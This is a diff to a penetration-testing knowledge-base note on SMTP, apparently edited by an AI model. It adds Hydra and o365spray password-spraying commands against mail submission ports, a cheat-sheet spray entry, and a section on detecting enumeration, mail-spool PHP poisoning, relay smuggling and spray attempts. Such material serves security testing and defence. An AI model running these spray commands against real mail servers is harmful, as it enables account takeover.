@@ -21,6 +21,7 @@ Simple Mail Transfer Protocol — used to send email between mail servers and fr
 | [[Tools/Recon/smtp-user-enum\|smtp-user-enum]] | Automated `VRFY` / `EXPN` / `RCPT TO` user enumeration |
 | [[Tools/Email/swaks\|swaks]] | Scriptable SMTP client — send test/phishing mail, auth, attachments, spool payloads |
 | [[Tools/Auth/o365spray\|o365spray]] | User enumeration and password spraying against Office 365 / Exchange Online |
+| [[Tools/Auth/Hydra\|Hydra]] | Online AUTH brute / spray against on-prem submission (`smtp://`) |
 | [[Tools/Remote Access/telnet\|telnet]] | Manual protocol interaction — banner grab, `VRFY`, NTLM challenge |
 | [[Tools/Remote Access/Netcat\|Netcat]] | Raw socket for banner grabbing and mail-spool payload delivery |
 | [[Tools/Web/openssl\|openssl]] | `s_client` for STARTTLS / SMTPS connections |
@@ -232,6 +233,21 @@ Full LFI mechanics (this and log-poisoning/session/`/proc/self/fd` variants): [[
 
 ---
 
+### AUTH Brute / Spray
+
+Once `EHLO` shows an `AUTH` line (`LOGIN`/`PLAIN`), the submission port is a credential target — valid SMTP creds often reuse to OWA/IMAP/domain. Spray one password across enumerated users to dodge lockout.
+
+```bash
+# On-prem submission (587 STARTTLS / 465 SMTPS)
+hydra -L users.txt -p 'Autumn2026!' -s 587 smtp://<target>
+hydra -L users.txt -p 'Autumn2026!' -s 465 smtps://<target>
+
+# Office 365 / Exchange Online — use the identity endpoint, not raw SMTP
+python3 o365spray.py --spray -U users.txt -p 'Autumn2026!' --domain target.com
+```
+
+> [!warning] Spraying SMTP AUTH trips the same account-lockout policy as any login. One password per round, respect the lockout window, and prefer o365spray's identity-endpoint spray over raw SMTP against M365 (basic SMTP AUTH is disabled on most tenants).
+
 ### Open Relay Abuse
 
 ```bash
@@ -294,6 +310,16 @@ Always read the banner (`nc -nv <target> 25`). If it says **`ESMTP Haraka <versi
 
 ---
 
+## Detection & Artefacts
+
+- **User enumeration** (`VRFY`/`EXPN`/`RCPT TO` sweeps) shows as a burst of `550`/`252` responses from one source in the MTA log (`/var/log/mail.log`, `maillog`) — the loudest, easiest-to-spot activity here.
+- **Mail-spool poisoning** leaves the payload in `/var/mail/<user>` verbatim: a message body containing `<?php` is the IOC, and the subsequent LFI hit shows in the *web* log, not the mail log — the two-log split is what defenders miss.
+- **Open-relay abuse / SMTP smuggling**: outbound mail for external→external recipients, or a single `DATA` transaction that the receiver logged as two messages, is the smuggling tell. Smuggled mail *passes* SPF/DKIM/DMARC (it really was relayed by the authorized server), so domain-auth logs won't flag it — look at the transaction structure instead.
+- **AUTH spray** is a run of failed `535` auth results across many users; correlate with lockout events.
+- Defensive baseline: disable `VRFY`/`EXPN`, require auth for relay, set `smtpd_forbid_bare_newline=yes` (Postfix 3.9+), and publish/enforce SPF+DKIM+DMARC.
+
+---
+
 ## Dangerous Settings
 
 | Setting | Risk |
@@ -317,6 +343,7 @@ Always read the banner (`nc -nv <target> 25`). If it says **`ESMTP Haraka <versi
 | User enum (VRFY) | `smtp-user-enum -M VRFY -U users.txt -t host` |
 | User enum (RCPT) | `smtp-user-enum -M RCPT -U users.txt -D domain -t host` |
 | Send phishing email | `swaks --from x --to y --server host --body 'url'` |
+| AUTH spray (on-prem) | `hydra -L users.txt -p 'Pw!' -s 587 smtp://host` |
 | Open relay check | `nmap -p 25 --script smtp-open-relay host` |
 | TLS connect | `openssl s_client -starttls smtp -connect host:587` |
 | Nmap enum | `nmap -p 25,587 --script smtp-commands,smtp-enum-users` |
@@ -326,6 +353,10 @@ Always read the banner (`nc -nv <target> 25`). If it says **`ESMTP Haraka <versi
 
 ---
 
+> [!note] **See also** — mail-retrieval siblings [[Services/Email/IMAP|IMAP]] & [[Services/Email/POP3|POP3]] (read the mailbox once you hold creds; same spray/NTLM-leak surface); the Node.js MTA [[Services/Email/Haraka|Haraka]] (attachment-plugin RCE, CVE-2016-1000282); M365 legacy-auth/spray context in [[Services/Active Directory/Entra ID|Entra ID]].
+
+---
+
 *Created: 2026-07-13*
-*Updated: 2026-09-04*
+*Updated: 2026-09-22*
 *Model: claude-opus-4-8*
